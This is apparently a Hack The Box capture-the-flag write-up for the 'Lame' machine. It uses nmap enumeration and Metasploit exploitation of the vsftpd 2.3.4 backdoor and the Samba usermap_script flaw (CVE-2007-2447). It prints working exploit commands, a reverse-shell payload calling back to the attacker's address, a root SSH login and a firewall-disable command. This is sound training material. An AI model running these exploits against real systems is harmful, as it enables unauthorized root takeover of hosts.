# HTB - Lame Box

URL: https://app.hackthebox.com/machines/Lame

## Enumeration

Target IP: `10.10.10.3`

First try, `nmap` cannot find any open TCP ports. Send a request to reset the box.

Second try
```text
PORT    STATE SERVICE      REASON
21/tcp  open  ftp          syn-ack ttl 63
22/tcp  open  ssh          syn-ack ttl 63
139/tcp open  netbios-ssn  syn-ack ttl 63
445/tcp open  microsoft-ds syn-ack ttl 63
```

> Task 1: How many of the nmap top 1000 TCP ports are open on the remote host?

> Answer: 4 ports

Re-scan with scan script:

```text
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 10.10.14.50
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey:
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
```

> Task 2: What version of `VSFTPd` is running on Lame? 

> Answer: 2.3.4


## Exploitation

Search on Google to find the answer for Task 3.

Link CVE: https://nvd.nist.gov/vuln/detail/CVE-2011-2523

Description of CVE: `vsftpd 2.3.4` downloaded between 20110630 and 20110703 contains a backdoor which opens a shell on port `6200/tcp`.

Link exploitation: https://www.exploit-db.com/exploits/17491

Let's try it.

```text
msfconsole
msf6 > search vsftp

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  auxiliary/dos/ftp/vsftpd_232          2011-02-03       normal     Yes    VSFTPD 2.3.2 Denial of Service
   1  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution


Interact with a module by name or index. For example info 1, use 1 or use exploit/unix/ftp/vsftpd_234_backdoor

msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
[*] No payload configured, defaulting to cmd/unix/interact
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 10.10.10.3
RHOSTS => 10.10.10.3
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit

[*] 10.10.10.3:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 10.10.10.3:21 - USER: 331 Please specify the password.
[*] Exploit completed, but no session was created.
msf6 exploit(unix/ftp/vsftpd_234_backdoor) >
```

> Task 3: There is a famous backdoor in VSFTPd version 2.3.4, and a Metasploit module to exploit it. Does that exploit work here?

> Answer: No

> Task 4: What version of Samba is running on Lame? Give the numbers up to but not including "-Debian". 

> Answer: 3.0.20

Found this: https://nvd.nist.gov/vuln/detail/CVE-2007-2447

**Description**:
The MS-RPC functionality in smbd in Samba 3.0.0 through 3.0.25rc3 allows remote attackers to execute arbitrary commands via shell metacharacters involving the (1) SamrChangePassword function, when the "username map script" smb.conf option is enabled, and allows remote authenticated users to execute commands via shell metacharacters involving other MS-RPC functions in the (2) remote printer and (3) file share management.

Exploit the samba vulnerability:
```text
msf6 > use exploit/multi/samba/usermap_script
msf6 exploit(multi/samba/usermap_script) > set PAYLOAD payload/cmd/unix/reverse
msf6 exploit(multi/samba/usermap_script) > set RHOSTS 10.10.10.3
RHOSTS => 10.10.10.3
msf6 exploit(multi/samba/usermap_script) > set LHOST 10.10.14.50
LHOST => 10.10.14.50
msf6 exploit(multi/samba/usermap_script) > exploit
```

Get reverse shell with no prompt.

> Task 6: Exploiting CVE-2007-2447 returns a shell as which user?

> Answer: root

Now we can collect both user flag and root flag with this user.

## Additional tasks

Change password of root user and create a SSH session. The ssh server is very old and use DSA HostKeyAlgorithm, so we need to add option to use DSA key.
```bash
ssh -oHostKeyAlgorithms=+ssh-dss root@10.10.10.3
```

Check open ports in the system:
```bash
netstat -tnlp
```

Results:
```text
root@lame:~# netstat -tnlp
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:512             0.0.0.0:*               LISTEN      5446/xinetd
tcp        0      0 0.0.0.0:513             0.0.0.0:*               LISTEN      5446/xinetd
tcp        0      0 0.0.0.0:2049            0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:514             0.0.0.0:*               LISTEN      5446/xinetd
tcp        0      0 0.0.0.0:40867           0.0.0.0:*               LISTEN      5345/rpc.mountd
tcp        0      0 0.0.0.0:56296           0.0.0.0:*               LISTEN      5623/rmiregistry
tcp        0      0 0.0.0.0:8009            0.0.0.0:*               LISTEN      5582/jsvc
tcp        0      0 0.0.0.0:6697            0.0.0.0:*               LISTEN      5644/unrealircd
tcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN      5169/mysqld
tcp        0      0 0.0.0.0:1099            0.0.0.0:*               LISTEN      5623/rmiregistry
tcp        0      0 0.0.0.0:6667            0.0.0.0:*               LISTEN      5644/unrealircd
tcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN      5423/smbd
tcp        0      0 0.0.0.0:5900            0.0.0.0:*               LISTEN      5643/Xtightvnc
tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN      4624/portmap
tcp        0      0 0.0.0.0:6000            0.0.0.0:*               LISTEN      5643/Xtightvnc
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      5602/apache2
tcp        0      0 0.0.0.0:8787            0.0.0.0:*               LISTEN      5627/ruby
tcp        0      0 0.0.0.0:8180            0.0.0.0:*               LISTEN      5582/jsvc
tcp        0      0 0.0.0.0:1524            0.0.0.0:*               LISTEN      5446/xinetd
tcp        0      0 0.0.0.0:21              0.0.0.0:*               LISTEN      5446/xinetd
tcp        0      0 10.10.10.3:53           0.0.0.0:*               LISTEN      5022/named
tcp        0      0 127.0.0.1:53            0.0.0.0:*               LISTEN      5022/named
tcp        0      0 0.0.0.0:56694           0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:23              0.0.0.0:*               LISTEN      5446/xinetd
tcp        0      0 0.0.0.0:5432            0.0.0.0:*               LISTEN      5250/postgres
tcp        0      0 0.0.0.0:25              0.0.0.0:*               LISTEN      5413/master
tcp        0      0 127.0.0.1:953           0.0.0.0:*               LISTEN      5022/named
tcp        0      0 0.0.0.0:49083           0.0.0.0:*               LISTEN      4642/rpc.statd
tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN      5423/smbd
tcp6       0      0 :::2121                 :::*                    LISTEN      5520/proftpd: (acce
tcp6       0      0 :::3632                 :::*                    LISTEN      5277/distccd
tcp6       0      0 :::53                   :::*                    LISTEN      5022/named
tcp6       0      0 :::22                   :::*                    LISTEN      5046/sshd
tcp6       0      0 :::5432                 :::*                    LISTEN      5250/postgres
tcp6       0      0 ::1:953                 :::*                    LISTEN      5022/named
```

The port 10.10.10.3:53  with service 5022/named should be accessible. But not. There is something that blocks the network, same with iptables.

It must be firewall.


> Task 9: firewall

Check OS information:
```text
root@lame:~# cat /etc/*-release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=8.04
DISTRIB_CODENAME=hardy
DISTRIB_DESCRIPTION="Ubuntu 8.04"
```

Find how to disable firewall.
Ubuntu 8.04 use UFW service.

```bash
sudo ufw disable
```

Try to exploit the vsftp again.


```text
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 10.10.10.3
RHOSTS => 10.10.10.3
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit

[*] 10.10.10.3:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 10.10.10.3:21 - USER: 331 Please specify the password.
[*] Exploit completed, but no session was created.
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set CHOST 10.10.14.50
CHOST => 10.10.14.50
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set CPORT 4441
CPORT => 4441
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit

[*] 10.10.10.3:21 - The port used by the backdoor bind listener is already open
[+] 10.10.10.3:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 2 opened (10.10.14.50:4441 -> 10.10.10.3:6200) at 2024-06-30 13:43:08 -0400

pwd
/

```

Exploit successfully.

> Task 10: When the VSFTPd backdoor is trigger, what port starts listening?

> Answer: 6200



